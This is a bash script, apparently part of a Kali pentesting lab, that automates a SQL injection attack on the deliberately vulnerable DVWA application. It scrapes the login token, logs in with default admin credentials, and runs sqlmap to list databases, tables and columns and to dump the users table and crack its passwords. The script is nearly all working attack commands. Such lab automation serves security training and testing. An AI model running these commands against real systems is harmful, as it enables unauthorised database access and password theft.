#!/usr/bin/env bash
source $(pwd)/../config/config.sh

echo "Start [$(date "+%Y-%m-%d %H:%M:%S")]: Running injection-sql"
t0=$(date +%s)

# --- ATTACK---
#get user token
TOKEN=$(curl -c /home/kali/Pentesting/utils/dvwa.session -s http://$target_ip_msf/dvwa/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
# get session id
PHPSESSID=$(grep PHPSESSID /home/kali/Pentesting/utils/dvwa.session | awk -F' ' '{print $7}')
# log in
curl -L -b "PHPSESSID=${PHPSESSID};security=low" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://$target_ip_msf/dvwa/login.php

# list all databases
sudo sqlmap --cookie="PHPSESSID=${PHPSESSID};security=low" -u "http://$target_ip_msf/dvwa/vulnerabilities/sqli/index.php?id=1&Submit=Submit" --dbs

# list all tables in dvwa
sudo sqlmap --cookie="PHPSESSID=${PHPSESSID};security=low" -u "http://$target_ip_msf/dvwa/vulnerabilities/sqli/index.php?id=1&Submit=Submit" -D dvwa --tables

# list all columns in table users
sudo sqlmap --cookie="PHPSESSID=${PHPSESSID};security=low" -u "http://$target_ip_msf/dvwa/vulnerabilities/sqli/index.php?id=1&Submit=Submit" -D dvwa -T users --columns

# lists table users and cracks all the passwords
sudo sqlmap --cookie="PHPSESSID=${PHPSESSID};security=low" -u "http://$target_ip_msf/dvwa/vulnerabilities/sqli/index.php?id=1&Submit=Submit" -D dvwa -T users --dump --batch --answers="store=N,crack=Y"
# --- ATTACK---

t=$(date +%s)
elapsed_time=$((t - t0))
echo "End [$(date "+%Y-%m-%d %H:%M:%S")]: Running injection-sql (took $elapsed_time seconds)"
